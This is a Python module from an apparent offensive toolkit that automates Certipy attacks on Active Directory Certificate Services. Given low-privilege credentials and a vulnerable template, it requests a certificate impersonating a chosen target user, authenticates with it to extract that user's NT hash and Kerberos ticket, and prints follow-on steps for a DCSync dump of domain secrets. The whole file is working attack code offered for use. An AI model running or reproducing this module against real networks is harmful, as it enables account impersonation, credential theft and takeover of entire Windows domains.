"""
Certipy AD CS Exploitation Module
Request certificates as other users and authenticate to get NT hashes
"""

import os
from core.module_base import ModuleBase, ModuleType, Platform


class CertipyExploit(ModuleBase):
    """
    Certipy exploitation module for AD Certificate Services.
    Exploits ESC vulnerabilities to obtain certificates and NT hashes.
    """

    def __init__(self):
        super().__init__()
        self.name = "certipy_exploit"
        self.description = "Certipy AD CS exploitation - request certs and get NT hashes"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "adcs", "certificate", "certipy", "esc1", "exploit", "pkinit"]
        self.references = [
            "https://github.com/ly4k/Certipy",
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username with enrollment rights", required=True)
        self.register_option("PASS", "Password for USER", required=True)

        # Certificate options
        self.register_option("CA", "Certificate Authority name", required=True)
        self.register_option("TEMPLATE", "Vulnerable template name", required=True)
        self.register_option("TARGET_USER", "Target user to impersonate (for ESC1)", required=True)

        # Action options
        self.register_option("ACTION", "Action to perform",
                           default="full",
                           choices=["request", "auth", "full"])
        self.register_option("PFX_FILE", "PFX file for auth action (if not using full)", default="")

        # Output
        self.register_option("OUTPUT", "Output file prefix", default="certipy_exploit")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        ca = self.get_option("CA")
        template = self.get_option("TEMPLATE")
        target_user = self.get_option("TARGET_USER")
        action = self.get_option("ACTION")
        pfx_file = self.get_option("PFX_FILE")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Attacking User: {user}")
        self.print_status(f"CA: {ca}")
        self.print_status(f"Template: {template}")
        self.print_status(f"Target User: {target_user}")
        self.print_status(f"Action: {action}")
        self.print_line()

        certipy_path = "/root/.local/share/pipx/venvs/netexec/bin/certipy"
        pfx_output = f"{target_user.lower()}.pfx"
        nt_hash = None

        # Step 1: Request certificate (if action is request or full)
        if action in ["request", "full"]:
            self.print_status("[*] Step 1: Requesting certificate...")

            req_cmd = (f"{certipy_path} req "
                      f"-u '{user}@{domain}' "
                      f"-p '{password}' "
                      f"-dc-ip {dc_ip} "
                      f"-ca {ca} "
                      f"-template {template} "
                      f"-upn {target_user}@{domain} "
                      f"-out {target_user.lower()}")

            self.print_status(f"Command: certipy req -u {user}@{domain} -p [HIDDEN] -dc-ip {dc_ip} -ca {ca} -template {template} -upn {target_user}@{domain}")
            self.print_line()

            ret, stdout, stderr = self.run_in_exegol(req_cmd, timeout=120)
            output_text = stdout + stderr

            if "Successfully requested certificate" in output_text or "Wrote certificate" in output_text:
                self.print_good(f"Certificate obtained for {target_user}!")
                for line in output_text.split('\n'):
                    if "Saving" in line or "Wrote" in line or "Got certificate" in line:
                        self.print_good(f"  {line.strip()}")
            else:
                self.print_error("Certificate request failed")
                for line in output_text.split('\n'):
                    if line.strip():
                        self.print_error(f"  {line}")
                return False

        # Step 2: Authenticate with certificate (if action is auth or full)
        if action in ["auth", "full"]:
            self.print_line()
            self.print_status("[*] Step 2: Authenticating with certificate...")

            if action == "auth" and pfx_file:
                pfx_output = pfx_file

            auth_cmd = (f"{certipy_path} auth "
                       f"-pfx {pfx_output} "
                       f"-dc-ip {dc_ip}")

            self.print_status(f"Command: certipy auth -pfx {pfx_output} -dc-ip {dc_ip}")
            self.print_line()

            ret, stdout, stderr = self.run_in_exegol(auth_cmd, timeout=120)
            output_text = stdout + stderr

            # Parse for NT hash
            for line in output_text.split('\n'):
                if "Got hash for" in line:
                    self.print_good(line.strip())
                    # Extract hash
                    if ":" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            nt_hash = parts[-1].strip()
                elif "Got TGT" in line:
                    self.print_good(line.strip())
                elif "Saving credential cache" in line:
                    self.print_good(line.strip())
                elif "KDC_ERR" in line:
                    self.print_error(line.strip())
                    self.print_warning("Target user may have expired password. Try another Domain Admin.")
                    return False

            if nt_hash:
                self.print_line()
                self.print_good("=" * 60)
                self.print_good(f"TARGET COMPROMISED: {target_user}")
                self.print_good(f"NT Hash: {nt_hash}")
                self.print_good("=" * 60)
                self.print_line()
                self.print_status("Next steps - use hash for DCSync:")
                self.print_status(f"  setg USER {target_user}")
                self.print_status(f"  setg PASS {nt_hash}")
                self.print_status(f"  use auxiliary/ad/secretsdump")
                self.print_status(f"  set AUTH_TYPE hash")
                self.print_status(f"  set METHOD dcsync")
                self.print_status(f"  run")
                return True
            else:
                self.print_warning("Authentication completed but no hash extracted")
                self.print_line("Full output:")
                self.print_line(output_text)
                return ret == 0

        return True

    def check(self) -> bool:
        ret, stdout, stderr = self.run_in_exegol(
            "ls /root/.local/share/pipx/venvs/netexec/bin/certipy", timeout=10)
        return ret == 0
